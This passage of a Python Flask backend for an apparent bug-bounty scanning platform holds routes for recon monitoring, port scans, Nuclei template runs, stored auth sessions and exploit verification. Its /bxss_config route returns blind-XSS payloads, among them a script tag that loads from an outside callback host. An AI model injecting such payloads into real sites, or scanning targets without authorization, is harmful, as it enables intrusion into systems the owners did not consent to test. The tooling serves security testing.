        functions = payload.get("functions", ["subdomains", "ports", "js", "endpoints"])
        notify    = payload.get("notify", True)

        schedule = {
            "domain":    d,
            "interval":  interval,
            "functions": functions,
            "notify":    notify,
            "created_at":__import__("time").strftime("%Y-%m-%dT%H:%M:%SZ"),
            "last_run":  None,
            "run_count": 0,
        }
        # Save schedule to domain meta
        meta = db.get_meta(d) or {}
        meta["monitor_schedule"] = schedule
        db.save_meta(d, meta)

        # Start background monitor thread
        import threading as _thr, time as _tm
        def _monitor_worker():
            while True:
                try:
                    current_meta = db.get_meta(d) or {}
                    if not current_meta.get("monitor_schedule"):
                        break  # Schedule was deleted

                    sched = current_meta["monitor_schedule"]
                    _tm.sleep(sched.get("interval", 3600))

                    # Re-check if still scheduled
                    current_meta = db.get_meta(d) or {}
                    if not current_meta.get("monitor_schedule"):
                        break

                    import logging as _log2
                    _log = _log2.getLogger("elite.monitor")
                    _log.info(f"[monitor] Running scheduled recon for {d}")

                    # Save snapshot before re-run
                    try:
                        snap_before = MONITOR.save_snapshot(d, db)
                    except Exception:
                        snap_before = None

                    # Run lightweight recon if subdomains in functions
                    if "subdomains" in sched.get("functions", []):
                        from recon import run_recon as _run_recon
                        import queue as _q2
                        _q_mon = _q2.Queue()
                        try:
                            # run_recon(domain, opts, q, db)
                            _opts = {
                                "max_subs":   5000,
                                "skip_port":  True,
                                "skip_crawl": True,
                                "skip_js":    True,
                            }
                            _run_recon(d, _opts, _q_mon, db)
                        except Exception as _re2:
                            _log.warning(f"[monitor] recon error: {_re2}")

                    # Diff and notify on changes
                    try:
                        diff = MONITOR.latest_diff(d, db)
                        if diff:
                            new_subs  = len(diff.get("subdomains",{}).get("new",[]))
                            new_hosts = len(diff.get("hosts",{}).get("new",[]))
                            new_ends  = len(diff.get("endpoints",{}).get("new",[]))
                            if (new_subs + new_hosts + new_ends) > 0 and sched.get("notify"):
                                n = get_notifier()
                                n.send_raw({
                                    "title": f"🔔 Monitor Alert: {d}",
                                    "body": (
                                        "Changes in " + d + ":\n" +
                                        "New subdomains: " + str(new_subs) + "\n" +
                                        "New live hosts: " + str(new_hosts) + "\n" +
                                        "New endpoints: " + str(new_ends)
                                    ),
                                    "domain": d,
                                    "type":   "monitor_delta",
                                })
                                _log.info(f"[monitor] Alert sent: {d} +{new_subs}subs +{new_hosts}hosts")
                    except Exception as _de:
                        _log.debug(f"[monitor] diff error: {_de}")

                    # Update last_run
                    current_meta = db.get_meta(d) or {}
                    if current_meta.get("monitor_schedule"):
                        current_meta["monitor_schedule"]["last_run"] = _tm.strftime("%Y-%m-%dT%H:%M:%SZ")
                        current_meta["monitor_schedule"]["run_count"] = current_meta["monitor_schedule"].get("run_count",0) + 1
                        db.save_meta(d, current_meta)

                except Exception as _we:
                    import logging as _log3
                    _log3.getLogger("elite.monitor").warning(f"[monitor] worker error: {_we}")
                    _tm.sleep(60)

        # Start monitor thread if not already running
        thread_name = f"monitor-{d}"
        existing = [t for t in __import__("threading").enumerate() if t.name == thread_name]
        if not existing:
            t = _thr.Thread(target=_monitor_worker, name=thread_name, daemon=True)
            t.start()

        return jsonify({
            "ok":       True,
            "domain":   d,
            "schedule": schedule,
            "message":  f"Monitor scheduled every {interval}s for {functions}",
        })

    else:  # DELETE
        if not d:
            return jsonify({"error": "domain required"}), 400
        meta = db.get_meta(d) or {}
        meta.pop("monitor_schedule", None)
        db.save_meta(d, meta)
        return jsonify({"ok": True, "domain": d, "message": "Monitor stopped"})


@app.route("/monitor/alerts")
def monitor_alerts():
    try:
        from engine.monitor import get_alerts, mark_alerts_seen, get_unseen_count
        d          = request.args.get("domain","")
        unseen_only= request.args.get("unseen","false").lower()=="true"
        mark       = request.args.get("mark_seen","false").lower()=="true"
        alerts     = get_alerts(d, unseen_only)
        unseen_cnt = get_unseen_count()
        if mark and d: mark_alerts_seen(d)
        return jsonify({"alerts": alerts, "unseen": unseen_cnt})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/monitor/history")
def monitor_history():
    try:
        from engine.monitor import get_scan_history, get_trend
        d       = _domain(request.args.get("domain",""))
        history = get_scan_history(d)
        trend   = get_trend(d)
        return jsonify({"history": history, "trend": trend})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ── SaaS / Plans ──────────────────────────────────────────────────────────────
@app.route("/plans")
def plans_list():
    from engine.plans import PLANS
    return jsonify({"plans": PLANS})

@app.route("/auth/register", methods=["POST"])
def auth_register():
    try:
        from engine.plans import create_user
        payload  = request.get_json(silent=True, force=True) or {}
        email    = payload.get("email","")
        plan     = payload.get("plan","free")
        if not email or "@" not in email:
            return jsonify({"error": "Valid email required"}), 400
        user = create_user(email, plan)
        return jsonify({
            "ok":      True,
            "api_key": user.get("api_key",""),
            "plan":    plan,
            "email":   email,
            "message": "Save your API key — it won't be shown again",
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/auth/rotate_key", methods=["POST"])
def auth_rotate_key():
    try:
        from engine.plans import get_api_user_from_request, rotate_api_key
        user = get_api_user_from_request(request)
        if not user: return jsonify({"error": "Invalid API key"}), 401
        new_key = rotate_api_key(user["id"])
        return jsonify({"ok": True, "new_api_key": new_key})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/stripe/webhook", methods=["POST"])
def stripe_webhook():
    """Stripe webhook for subscription updates."""
    try:
        payload = request.get_json(silent=True, force=True) or {}
        event_type = payload.get("type","")
        if event_type == "customer.subscription.updated":
            data      = payload.get("data",{}).get("object",{})
            stripe_id = data.get("customer","")
            plan_id   = _stripe_plan_map(data.get("plan",{}).get("id",""))
            if stripe_id and plan_id:
                from engine.plans import _get_db
                with _get_db() as sdb:
                    sdb.execute("UPDATE users SET plan=? WHERE stripe_id=?",
                                (plan_id, stripe_id))
                log.info(f"[stripe] {stripe_id} → {plan_id}")
        return jsonify({"ok": True})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

def _stripe_plan_map(stripe_plan_id: str) -> str:
    # Map your Stripe price IDs to plan names
    mapping = {
        "price_pro_monthly":        "pro",
        "price_elite_monthly":      "elite",
        "price_enterprise_monthly": "enterprise",
    }
    return mapping.get(stripe_plan_id, "free")

@app.route("/port_scan")
def port_scan_route():
    """Standalone port scan — works without running full recon first."""
    from engine.rbac import verify_token as _vt_ps
    _tok_ps = (request.headers.get("Authorization","").replace("Bearer","").strip()
               or request.args.get("token","")
               or request.cookies.get("tmr_token",""))
    if not _vt_ps(_tok_ps):
        return Response(_sse({"type":"error","msg":"Unauthorized"}),
                        mimetype="text/event-stream", status=401)
    domain    = _domain(request.args.get("domain",""))
    mode      = request.args.get("port_mode","top100")
    custom    = request.args.get("custom_ports","")

    # ── Route-level guard: block all-ports before anything else runs ──────────
    # run_port_scan() also guards internally, but we clamp here so the SSE step
    # event never shows "all mode" to the client.
    if mode == "all":
        log.warning(f"[port_scan_route] port_mode=all rejected for {domain} — clamped to top100")
        mode = "top100"

    if not domain:
        return Response(_sse({"error":"no domain"}), mimetype="text/event-stream")

    q    = queue.Queue(maxsize=2000)
    sess = _sess(domain)

    def _run():
        try:
            from scanner import run_port_scan
            # Get live hosts from DB, or probe domain directly
            hosts_data = db.get_hosts(domain)
            lives = hosts_data.get("live",[]) or hosts_data.get("active",[])
            if not lives:
                # Probe domain directly
                import urllib.request, ssl
                ctx = ssl.create_default_context()
                ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                for scheme in ["https","http"]:
                    try:
                        req = urllib.request.Request(
                            f"{scheme}://{domain}",
                            headers={"User-Agent":"BugScan/5.0"})
                        with urllib.request.urlopen(req, timeout=6, context=ctx) as r:
                            if r.status < 500:
                                lives = [domain]
                                q.put({"type":"step","name":"ports","state":"run",
                                       "meta":f"probed {domain} → live"})
                                break
                    except: pass

            if not lives:
                q.put({"type":"step","name":"ports","state":"skip",
                       "meta":"domain unreachable"})
                q.put({"type":"port_scan_done","count":0})
                return

            # Strip http:// prefix
            import re as _re
            hosts = list(set(
                _re.sub(r"^https?://","",h).split("/")[0].split(":")[0]
                for h in lives[:20]
            ))

            # mode is already clamped above — safe to use directly
            q.put({"type":"step","name":"ports","state":"run",
                   "meta":f"scanning {len(hosts)} host(s) — {mode} mode"})

            found = run_port_scan(domain, hosts, mode, custom, q)
            for entry in found:
                db.add_port(domain, entry)

            q.put({"type":"step","name":"ports","state":"done",
                   "meta":f"{len(found)} open ports found"})
            q.put({"type":"port_scan_done","count":len(found),"ports":found[:100]})
        except Exception as e:
            log.error(f"[port_scan] {e}")
            q.put({"type":"error","msg":str(e)})
            q.put({"type":"port_scan_done","count":0})

    threading.Thread(target=_run, daemon=True, name=f"portscan-{domain}").start()

    def stream():
        while True:
            try: item = q.get(timeout=700)
            except queue.Empty: yield ": keepalive\n\n"; continue
            if item is None: break
            yield _sse(item)
            if item.get("type") in ("port_scan_done","error"): break

    return Response(stream(), mimetype="text/event-stream",
                    headers={"Cache-Control":"no-cache","X-Accel-Buffering":"no"})


# ── BXSS Config Route ─────────────────────────────────────────────────────────
@app.route("/bxss_config")
def bxss_config():
    """Return current BXSS configuration."""
    host = os.getenv("BXSS_HOST","ezz.hak.monster")
    hunter = os.getenv("XSS_HUNTER","themasterdoctor")
    return jsonify({
        "bxss_host":   host,
        "xss_hunter":  hunter,
        "xss_report":  f"https://xss.report/c/{hunter}",
        "payloads": [
            "><script src=//" + host + "</script>",
            "xss.report/c/" + hunter,
        ],
        "headers": ["User-Agent","Referer","X-Forwarded-For","X-Real-IP",
                    "X-Forwarded-Host","Origin","Via","X-Custom-Header"],
    })


# ── Proxy Routes ─────────────────────────────────────────────────────────────
@app.route("/proxy/stats")
def proxy_stats():
    from engine.proxy import get_stats
    return jsonify(get_stats())

@app.route("/proxy/requests")
def proxy_requests():
    try:
        from engine.proxy import get_captured
        domain = request.args.get("domain","")
        limit  = int(request.args.get("limit",200))
        return jsonify({"requests": get_captured(limit, domain)})
    except Exception as e:
        return jsonify({"requests":[], "error":str(e)})

@app.route("/proxy/clear", methods=["POST"])
def proxy_clear():
    from engine.proxy import _captured_reqs, _captured_lock
    with _captured_lock:
        _captured_reqs.clear()
    return jsonify({"status":"cleared"})


# ── Community Templates ──────────────────────────────────────────────────────
@app.route("/templates")
def list_templates():
    """List all Nuclei templates in nuclei_templates/ directory."""
    import pathlib
    tdir = pathlib.Path("nuclei_templates")
    if not tdir.exists():
        return jsonify({"templates": [], "count": 0})
    templates = []
    for f in sorted(tdir.glob("*.yaml")):
        try:
            content = f.read_text(encoding="utf-8")
            # Parse basic info
            name = ""
            sev  = ""
            tags = ""
            for line in content.splitlines()[:20]:
                if "name:" in line and not name: name = line.split("name:",1)[1].strip().strip('"')
                if "severity:" in line: sev = line.split("severity:",1)[1].strip()
                if "tags:" in line: tags = line.split("tags:",1)[1].strip()
            templates.append({
                "id":       f.stem,
                "filename": f.name,
                "name":     name or f.stem,
                "severity": sev,
                "tags":     tags,
                "size":     f.stat().st_size,
            })
        except: pass
    return jsonify({"templates": templates, "count": len(templates)})

@app.route("/templates/<template_id>")
def get_template(template_id):
    import pathlib, re
    # Sanitize
    safe_id = re.sub(r"[^a-zA-Z0-9_\-]","",template_id)
    path = pathlib.Path("nuclei_templates") / f"{safe_id}.yaml"
    if not path.exists():
        return jsonify({"error":"not found"}), 404
    return jsonify({"id":safe_id,"yaml":path.read_text(encoding="utf-8")})

@app.route("/templates/run", methods=["POST"])
def run_template():
    """Run a specific Nuclei template against a target."""
    import shutil, subprocess, pathlib
    body   = request.get_json(silent=True, force=True) or {}
    tmpl   = body.get("template_id","")
    target = body.get("target","")
    if not tmpl or not target:
        return jsonify({"error":"template_id and target required"}), 400
    import re; safe = re.sub(r"[^a-zA-Z0-9_\-]","",tmpl)
    path = pathlib.Path("nuclei_templates") / f"{safe}.yaml"
    if not path.exists():
        return jsonify({"error":"template not found"}), 404
    nuclei = shutil.which("nuclei")
    if not nuclei:
        return jsonify({"error":"nuclei not installed","hint":"bash install_tools.sh"}), 503
    try:
        out = subprocess.run(
            [nuclei, "-t", str(path), "-u", target, "-j", "-silent"],
            capture_output=True, text=True, timeout=60
        )
        results = []
        for line in out.stdout.splitlines():
            try: results.append(json.loads(line))
            except: pass
        return jsonify({"results": results, "count": len(results)})
    except subprocess.TimeoutExpired:
        return jsonify({"error":"timeout","hint":"nuclei timed out after 60s"})
    except Exception as e:
        return jsonify({"error":str(e)}), 500


# ── Screenshots gallery route ─────────────────────────────────────────────────
# ── Authenticated scan session ────────────────────────────────────────────────
@app.route("/auth/session", methods=["POST"])
def auth_session_set():
    """Store auth session (cookies + token) for authenticated scanning."""
    body   = request.get_json(silent=True, force=True) or {}
    d      = _domain(body.get("domain",""))
    cookie = body.get("cookie","").strip()
    token  = body.get("token","").strip()
    token_type = body.get("token_type","Bearer").strip()
    if not d:
        return jsonify({"error":"domain required"}), 400
    # Store in DB for this domain
    db.save_auth(d, {"cookie": cookie, "token": token,
                     "token_type": token_type, "ts": __import__("time").strftime("%H:%M:%S")})
    return jsonify({"status":"saved", "domain": d,
                    "has_cookie": bool(cookie), "has_token": bool(token)})
@app.route("/auth/test", methods=["POST"])
def auth_session_test():
    """Test if auth session is valid by hitting a protected endpoint."""
    body   = request.get_json(silent=True, force=True) or {}
    d      = _domain(body.get("domain",""))
    url    = body.get("url","").strip()
    cookie = body.get("cookie","").strip()
    token  = body.get("token","").strip()
    if not url:
        return jsonify({"error":"url required"}), 400
    import urllib.request, ssl, json as _json
    ctx = ssl.create_default_context()
    ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
    hdrs = {"User-Agent":"Mozilla/5.0"}
    if cookie: hdrs["Cookie"] = cookie
    if token:  hdrs["Authorization"] = f"Bearer {token}"
    try:
        req = urllib.request.Request(url, headers=hdrs)
        with urllib.request.urlopen(req, timeout=10, context=ctx) as r:
            body_out = r.read(4096).decode("utf-8","ignore")
            return jsonify({"status": r.status, "ok": r.status < 400,
                            "preview": body_out[:300]})
    except urllib.error.HTTPError as e:
        return jsonify({"status": e.code, "ok": False})
    except Exception as e:
        return jsonify({"error": str(e), "ok": False})

# ── New UI compatibility routes ───────────────────────────────────────────────

@app.route("/command_center")
def command_center():
    """
    GET /command_center?domain=example.com
    
    Unified command center — shows complete pipeline state for a domain.
    Returns: scope, recon status, live hosts, endpoints, scan state,
             findings by XBOW grade, report readiness, chain count.
    
    This is the single pane of glass for bug bounty operations.
    """
    d = _domain(request.args.get("domain",""))
    if not d:
        # Return cross-domain summary
        all_domains = db.list_domains()
        return jsonify({
            "type":    "global_summary",
            "domains": len(all_domains),
            "message": "Provide ?domain=example.com for domain-specific command center",
        })

    # ── 1. Scope ──────────────────────────────────────────────────────────────
    meta       = db.get_meta(d) or {}
    scope_dict = meta.get("scope", {})
    scope_ok   = bool(scope_dict.get("includes") or scope_dict.get("excludes"))

    # ── 2. Recon status ───────────────────────────────────────────────────────
    subs_count  = db.count_subs(d)
    hosts       = db.get_hosts(d)
    live_hosts  = hosts.get("active", [])
    live_count  = len(live_hosts)
    ends_count  = db.count_endpoints(d)
    tech_count  = len(db.get_tech(d) or [])

    # ── 3. Scan status ────────────────────────────────────────────────────────
    sess        = _sess(d)
    recon_live  = bool(sess.get("recon_t") and sess["recon_t"].is_alive())
    scan_live   = bool(sess.get("scan_t") and sess["scan_t"].is_alive())

    # ── 4. Findings by XBOW grade ─────────────────────────────────────────────
    all_finds   = db.get_findings(d)
    total_finds = len(all_finds)

    grades      = {"A": 0, "B": 0, "C": 0, "D": 0, "F": 0, "ungraded": 0}
    verdicts    = {"confirmed": 0, "needs_review": 0, "likely_fp": 0, "insufficient_evidence": 0}
    sev_counts  = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
    report_ready = 0
    chain_risk_high = 0

    for f in all_finds:
        grade   = f.get("_xbow_grade","")
        verdict = f.get("_xbow_verdict","")
        sev     = f.get("severity","info")
        sev_counts[sev] = sev_counts.get(sev, 0) + 1
        if grade:
            grades[grade] = grades.get(grade, 0) + 1
        else:
            grades["ungraded"] += 1
        if verdict:
            verdicts[verdict] = verdicts.get(verdict, 0) + 1
        if f.get("_xbow_report_ready"):
            report_ready += 1
        if f.get("_mythos_chain_risk",0) >= 70:
            chain_risk_high += 1

    # ── 5. Chains ─────────────────────────────────────────────────────────────
    chains      = db.get_chains(d)
    chain_count = len(chains)

    # ── 6. Top confirmed findings ─────────────────────────────────────────────
    confirmed   = [f for f in all_finds if
                   f.get("_xbow_verdict") == "confirmed" and
                   f.get("severity") in ("critical","high")]
    confirmed.sort(key=lambda x: (
        0 if x.get("severity") == "critical" else 1,
        -x.get("_xbow_evidence_score", 0)
    ))
    top_confirmed = [{
        "bug":           f.get("bug",""),
        "severity":      f.get("severity",""),
        "url":           f.get("url","")[:80],
        "grade":         f.get("_xbow_grade",""),
        "evidence_score":f.get("_xbow_evidence_score",0),
        "report_ready":  f.get("_xbow_report_ready",False),
        "chain_risk":    f.get("_mythos_chain_risk",0),
    } for f in confirmed[:10]]

    # ── 7. Pipeline completion percentage ─────────────────────────────────────
    pipeline = [
        {"stage": "scope_defined",        "done": scope_ok,            "label": "Scope Defined"},
        {"stage": "subdomains_discovered", "done": subs_count > 0,      "label": f"Subdomains: {subs_count}"},
        {"stage": "hosts_probed",          "done": live_count > 0,      "label": f"Live Hosts: {live_count}"},
        {"stage": "endpoints_collected",   "done": ends_count > 0,      "label": f"Endpoints: {ends_count}"},
        {"stage": "tech_fingerprinted",    "done": tech_count > 0,      "label": f"Tech: {tech_count}"},
        {"stage": "vulnerabilities_found", "done": total_finds > 0,     "label": f"Findings: {total_finds}"},
        {"stage": "evidence_graded",       "done": grades["ungraded"] < total_finds, "label": f"XBOW Graded: {total_finds - grades['ungraded']}/{total_finds}"},
        {"stage": "reports_ready",         "done": report_ready > 0,    "label": f"Report-Ready: {report_ready}"},
    ]
    done_stages = sum(1 for p in pipeline if p["done"])
    pipeline_pct = round(done_stages / len(pipeline) * 100)

    # ── 8. Action items ───────────────────────────────────────────────────────
    actions = []
    if not scope_ok:
        actions.append({"priority": "high", "action": "Define scope rules",
                        "hint": "POST /scope/" + d + " or POST /scope/import_h1"})
    if subs_count == 0:
        actions.append({"priority": "high", "action": "Run recon to discover subdomains",
                        "hint": "POST /recon with domain=" + d})
    if live_count == 0 and subs_count > 0:
        actions.append({"priority": "high", "action": "HTTP probe discovered subdomains",
                        "hint": "Recon should probe automatically"})
    if ends_count == 0 and live_count > 0:
        actions.append({"priority": "medium", "action": "Collect endpoints from live hosts",
                        "hint": "Recon crawl stage needed"})
    if total_finds == 0 and ends_count > 0:
        actions.append({"priority": "medium", "action": "Run vulnerability scan",
                        "hint": "POST /scan with domain=" + d})
    if grades["ungraded"] > 0:
        actions.append({"priority": "low", "action": f"Grade {grades['ungraded']} ungraded findings",
                        "hint": "POST /xbow/batch_grade"})
    if report_ready > 0:
        actions.append({"priority": "low", "action": f"{report_ready} findings are report-ready",
                        "hint": "POST /ai/h1_format or GET /report?domain=" + d})

    return jsonify({
        "domain":          d,
        "pipeline_pct":    pipeline_pct,
        "pipeline":        pipeline,
        "scope": {
            "defined":     scope_ok,
            "includes":    scope_dict.get("includes",[]),
            "excludes":    scope_dict.get("excludes",[]),
        },
        "recon": {
            "running":     recon_live,
            "subdomains":  subs_count,
            "live_hosts":  live_count,
            "endpoints":   ends_count,
            "tech":        tech_count,
        },
        "scan": {
            "running":     scan_live,
        },
        "findings": {
            "total":       total_finds,
            "by_severity": sev_counts,
            "by_grade":    grades,
            "by_verdict":  verdicts,
            "report_ready":report_ready,
            "chain_risk_high": chain_risk_high,
        },
        "chains": {
            "count":       chain_count,
            "names":       [c.get("name","") for c in chains[:5]],
        },
        "top_confirmed":   top_confirmed,
        "actions":         actions,
        "status":          "active" if (recon_live or scan_live) else ("ready" if total_finds > 0 else "empty"),
    })


@app.route("/dashboard")
def dashboard():
    """Dashboard — comprehensive stats for home page."""
    import time as _t, os as _os, shutil as _sh
    all_domains = db.list_domains()

    total_finds = 0; total_crits = 0; total_highs = 0
    total_subs  = 0; total_live  = 0; total_ends  = 0
    sev   = {"critical":0,"high":0,"medium":0,"low":0,"info":0}
    bugs  = {}
    recent = []
    top_domains = []

    for dom_info in all_domains:
        d     = dom_info.get("domain","") if isinstance(dom_info, dict) else str(dom_info)
        finds = db.get_findings(d)
        hosts = db.get_hosts(d)
        ends  = db.count_endpoints(d)
        subs  = db.count_subs(d)
        live  = len(hosts.get("active",[]))

        crits = sum(1 for f in finds if f.get("severity")=="critical")
        highs = sum(1 for f in finds if f.get("severity")=="high")
        meds  = sum(1 for f in finds if f.get("severity")=="medium")
        lows  = sum(1 for f in finds if f.get("severity")=="low")

        total_finds += len(finds)
        total_crits += crits
        total_highs += highs
        total_subs  += subs
        total_live  += live
        total_ends  += ends

        for k in ["critical","high","medium","low"]:
            sev[k] += sum(1 for f in finds if f.get("severity")==k)
        for f in finds:
            bt = f.get("bug_type", f.get("bug",""))
            if bt: bugs[bt] = bugs.get(bt,0) + 1

        if finds or live:
            recent.append({
                "domain":   d,
                "findings": len(finds),
                "crits":    crits,
                "highs":    highs,
                "meds":     meds,
                "subs":     subs,
                "live":     live,
                "ends":     ends,
                "has_report": False,
                "time":     dom_info.get("last_scan","") if isinstance(dom_info, dict) else "",
            })

    # Sort bugs by count, take top 10
    top_bugs = sorted(bugs.items(), key=lambda x: x[1], reverse=True)[:10]

    # Tool status
    tools_available = 0
    for t in ["subfinder","httpx","nuclei","katana","ffuf","sqlmap","dalfox","nmap"]:
        if _sh.which(t): tools_available += 1

    sh_binary = _os.path.exists("secret_hunter") and _os.access("secret_hunter", _os.X_OK)
    nuclei_ok = bool(_sh.which("nuclei"))

    return jsonify({
        "domains":       len(all_domains),
        "findings":      total_finds,
        "critical":      total_crits,
        "high":          total_highs,
        "subdomains":    total_subs,
        "live_hosts":    total_live,
        "endpoints":     total_ends,
        "severity":      sev,
        "bugs":          bugs,
        "top_bugs":      top_bugs,
        "recent":        sorted(recent, key=lambda x: x.get("crits",0)+x.get("highs",0), reverse=True)[:10],
        "tools_available": tools_available,
        "tools_total":   8,
        "secret_hunter": sh_binary,
        "nuclei":        nuclei_ok,
        "uptime":        round(_t.time() - _START_TIME, 0),
        "ai_enabled":    bool(_os.environ.get("ANTHROPIC_API_KEY","")),
        "recon_sources": _count_recon_sources(),
    })


@app.route("/previous_scans")
def previous_scans():
    try:
        doms = db.list_domains()
        scans = []
        for dom_info in doms:
            # list_domains returns strings, not dicts
            d = dom_info if isinstance(dom_info, str) else dom_info.get("domain","")
            if not d: continue
            try:
                finds = db.get_findings(d)
                hosts = db.get_hosts(d)
                crits = sum(1 for f in finds if f.get("severity")=="critical")
                highs = sum(1 for f in finds if f.get("severity")=="high")
                scans.append({
                    "domain":    d,
                    "findings":  len(finds),
                    "critical":  crits,
                    "high":      highs,
                    "subs":      hosts.get("subs_count", 0),
                    "live":      hosts.get("active_count", 0),
                })
            except Exception:
                scans.append({"domain": d, "findings": 0, "critical": 0, "high": 0, "subs": 0, "live": 0})
        return jsonify({"scans": scans})
    except Exception as e:
        return jsonify({"scans": [], "error": str(e)})

@app.route("/results/<path:domain>")
def results_domain(domain):
    d = _domain(domain)
    findings = db.get_findings(d)
    return jsonify({"findings": findings, "count": len(findings)})

@app.route("/sublist")
def sublist():
    d = _domain(request.args.get("domain",""))
    hosts = db.get_hosts(d)
    return jsonify({"subs": hosts.get("subs",[]), "count": hosts.get("subs_count",0)})

@app.route("/kill", methods=["POST"])
def kill():
    """Alias for kill_scan."""
    return kill_scan()

@app.route("/kill_scan", methods=["POST"])
def kill_scan():
    """Hard stop for a specific domain — does not affect other concurrent scans."""
    payload = request.get_json(silent=True, force=True) or {}
    d = _domain(payload.get("domain","") or request.args.get("domain",""))
    sess = _sess(d)
    # Drain SSE queues so streaming connections close cleanly
    if sess.get("recon_q"): sess["recon_q"].put(None)
    if sess.get("scan_q"):  sess["scan_q"].put(None)
    # Signal only this domain's scan to stop
    if d:
        try:
            from scanner import _set_stop_event
            _set_stop_event(d)
        except Exception: pass
    return jsonify({"ok": True, "stopped": d})

@app.route("/classified_ends")
def classified_ends():
    d = _domain(request.args.get("domain",""))
    ends = db.get_endpoints(d, limit=5000)
    return jsonify({"ends": ends, "count": len(ends)})

@app.route("/classify_status")
def classify_status():
    return jsonify({"status": "idle", "done": True})

@app.route("/clear_results", methods=["POST"])
def clear_results():
    d = _domain((request.get_json(silent=True, force=True) or {}).get("domain",""))
    # Clear findings for domain
    dd = db._dd(d)
    (dd/"findings.json").write_text("[]")
    return jsonify({"ok": True})

@app.route("/clear_all_results", methods=["POST"])
def clear_all_results():
    db.delete_all()
    return jsonify({"ok": True})

@app.route("/list_reports")
def list_reports():
    all_d = db.list_domains()
    reports = []
    for dom in all_d:
        d = dom.get("domain","")
        rep = db.get_report(d)
        if rep:
            finds = db.get_findings(d)
            crits = sum(1 for f in finds if f.get("severity")=="critical")
            highs = sum(1 for f in finds if f.get("severity")=="high")
            sev = "critical" if crits else "high" if highs else "medium"
            reports.append({
                "domain": d, "report": rep[:500],
                "severity": sev, "findings": len(finds),
                "critical": crits, "high": highs,
            })
    return jsonify({"reports": reports})

@app.route("/get_report")
def get_report():
    d = _domain(request.args.get("domain",""))
    return jsonify({"report": db.get_report(d), "domain": d})

@app.route("/save_report", methods=["POST"])
def save_report_route():
    payload = request.get_json(silent=True, force=True) or {}
    d   = _domain(payload.get("domain",""))
    rep = payload.get("report","")
    db.save_report(d, rep)
    return jsonify({"ok": True})

@app.route("/report_status")
def report_status():
    return jsonify({"generating": False, "done": True})

@app.route("/stop_report", methods=["POST"])
def stop_report():
    return jsonify({"ok": True})

@app.route("/save_auth", methods=["POST"])
def save_auth_route():
    payload = request.get_json(silent=True, force=True) or {}
    d = _domain(payload.get("domain",""))
    db.save_meta(d, {"auth": payload})
    return jsonify({"ok": True})

@app.route("/load_auth")
def load_auth_route():
    d = _domain(request.args.get("domain",""))
    meta = db.get_meta(d)
    return jsonify(meta.get("auth", {}))

@app.route("/scan_ep")
def scan_ep():
    """Scan a specific filtered set of endpoints."""
    d    = _domain(request.args.get("domain",""))
    bugs = request.args.getlist("bugs")
    ends = db.get_endpoints(d, limit=5000)
    return jsonify({"endpoints": ends[:100], "count": len(ends)})

@app.route("/scan_js")
def scan_js_sse():
    """SSE stream for JS deep scan."""
    d = _domain(request.args.get("domain",""))
    q = queue.Queue()
    def _run():
        try:
            ends = db.get_endpoints(d, limit=20000)
            from engine.js_analyzer import analyze_all_js
            results = analyze_all_js(ends, d)
            db.save_js_analysis(d, results)
            for r in results:
                q.put({"type":"js_result","url":r.get("url",""),
                       "secrets": len(r.get("secrets",[])),
                       "routes":  len(r.get("routes",[]))})
        except Exception as e:
            q.put({"type":"error","msg":str(e)})
        finally:
            q.put({"type":"js_done"})
    threading.Thread(target=_run, daemon=True).start()
    def stream():
        while True:
            try: item = q.get(timeout=25)
            except queue.Empty: yield ": keepalive\n\n"; continue
            yield _sse(item)
            if item.get("type") in ("js_done","error"): break
    return Response(stream(), mimetype="text/event-stream",
                    headers={"Cache-Control":"no-cache","X-Accel-Buffering":"no"})



# ════════════════════════════════════════════════════════════════════════════
# MONTH 1-4 UPGRADES — Live Feed, Verify, AutoHunt, NL Scan, Diff, Usage
# ════════════════════════════════════════════════════════════════════════════

# ── Live Scan Feed (real-time [TESTING]/[RESULT] SSE stream) ─────────────────
@app.route("/scan/feed")
def scan_feed_sse():
    """SSE stream of live scan activity: [TESTING] / [RESULT] / [FINDING] events."""
    from flask import stream_with_context
    import queue as _q
    domain = _domain(request.args.get("domain",""))

    # Create or attach to an existing feed queue for this domain
    feed_key = f"feed:{domain}"
    with _scan_queues_lock:
        if feed_key not in _scan_queues:
            _scan_queues[feed_key] = _q.Queue(maxsize=500)
    fq = _scan_queues[feed_key]

    def _gen():
        while True:
            try:
                evt = fq.get(timeout=25)
                yield _sse(evt)
            except _q.Empty:
                yield ": heartbeat\n\n"

    return Response(stream_with_context(_gen()),
                    mimetype="text/event-stream",
                    headers={"Cache-Control":"no-cache","X-Accel-Buffering":"no"})


# ── Exploit Verification ──────────────────────────────────────────────────────
@app.route("/findings/verify", methods=["POST"])
def findings_verify():
    """Re-run payload to confirm a finding. Returns {verified, confidence, evidence}."""
    p      = request.get_json(silent=True, force=True) or {}
    fid    = p.get("finding_id") or p.get("id")
    domain = _domain(p.get("domain",""))
    if not (fid and domain):
        return jsonify({"error":"finding_id and domain required"}), 400
    try:
        finds  = db.get_findings(domain)
        target = next((f for f in finds if str(f.get("id","")) == str(fid)), None)
        if not target:
            return jsonify({"error":"finding not found"}), 404
        from engine.exploit_verify import verify_finding
        result = verify_finding(target, attempts=3)
        if result["verified"] and hasattr(db, "mark_confirmed"):
            db.mark_confirmed(int(fid))
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/findings/verify_all", methods=["POST"])
def findings_verify_all():
    """Batch verify all CRITICAL/HIGH findings for a domain (runs async)."""
    p      = request.get_json(silent=True, force=True) or {}
    domain = _domain(p.get("domain",""))
    if not domain: return jsonify({"error":"domain required"}), 400
    import threading
    def _run():
        try:
            finds = db.get_findings(domain)
            from engine.exploit_verify import verify_all_critical
            verify_all_critical(finds, db=db, domain=domain)
        except Exception as e:
            log.error(f"verify_all: {e}")
    threading.Thread(target=_run, daemon=True).start()
    return jsonify({"ok": True, "msg": "verification started in background"})


# ── AI False-Positive Filter ──────────────────────────────────────────────────
@app.route("/findings/ai_filter", methods=["POST"])
def findings_ai_filter():
    """Run AI false-positive filter on a single finding."""
    p      = request.get_json(silent=True, force=True) or {}
    fid    = p.get("finding_id") or p.get("id")
    domain = _domain(p.get("domain",""))
